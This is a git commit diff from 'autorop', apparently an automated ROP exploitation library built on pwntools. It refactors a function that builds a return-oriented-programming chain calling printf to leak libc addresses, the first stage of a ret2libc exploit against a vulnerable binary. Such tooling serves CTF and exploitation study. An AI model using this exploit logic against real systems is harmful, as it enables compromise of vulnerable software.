b0a9598c6bdc1f677d24f396ac7e74a2c932dc83
Mariusz Skoneczko <mariusz@skoneczko.com>
2021-03-27 17:58:34 +1100

    Convert leak.printf to use parameterised nested function

--- autorop/leak/printf.py
+++ autorop/leak/printf.py
@@ -1,37 +1,41 @@
-from autorop import PwnState, arutil
+from autorop import PwnState, arutil, constants
 from pwn import ROP
+from typing import Iterable
 
 
-def printf(state: PwnState) -> PwnState:
+def printf(
+    short: bool = False, leak_symbols: Iterable[str] = ["__libc_start_main", "printf"]
+) -> constants.TYPE_PIPE:
     """Leak libc addresses using ``printf``.
 
-    This function leaks the libc addresses of ``__libc_start_main`` and ``printf``
-    using ``printf``, placing them in ``state.leaks``.
+    This returns a function which leaks the libc addresses of (by default)
+    ``__libc_start_main`` and ``printf`` using ``printf``,
+    placing them in ``state.leaks``.
 
     Arguments:
-        state: The current ``PwnState`` with the following set
-
-            - ``target``: What we want to exploit.
-            - ``_elf``: pwntools ``ELF`` of ``state.binary_name``.
-            - ``overwriter``: Function which writes rop chain to the "right place".
-            - ``vuln_function``: Name of vulnerable function in binary,
-              which we can return to repeatedly.
+        short: Whether the attack should be minimised i.e. leak only one address.
+        leak_symbols: What symbols should be leaked.
 
     Returns:
-        Mutated ``PwnState``, with the following updated
+        Function which takes a state, and returns the Mutated ``PwnState``,
+        with the following updated
 
             - ``target``: The instance of target from which we got a successful leak.
               Hopefully it can still be interacted with.
             - ``leaks``: Updated with ``"symbol": address`` pairs for each
               function address of libc that was leaked.
     """
-    LEAK_FUNCS = ["__libc_start_main", "printf"]
+    if short:
+        leak_symbols = [next(iter(leak_symbols))]
 
-    def leaker(rop: ROP, address: int) -> ROP:
-        arutil.align_call(rop, "printf", [address])
-        assert state._elf is not None
-        # must send newline to satisfy ``arutil.leak_helper``
-        arutil.align_call(rop, "printf", [next(state._elf.search(b"\n\x00"))])
-        return rop
+    def printf_instance(state: PwnState) -> PwnState:
+        def leaker(rop: ROP, address: int) -> ROP:
+            arutil.align_call(rop, "printf", [address])
+            assert state._elf is not None
+            # must send newline to satisfy ``arutil.leak_helper``
+            arutil.align_call(rop, "printf", [next(state._elf.search(b"\n\x00"))])
+            return rop
 
-    return arutil.leak_helper(state, leaker, LEAK_FUNCS)
+        return arutil.leak_helper(state, leaker, leak_symbols)
+
+    return printf_instance
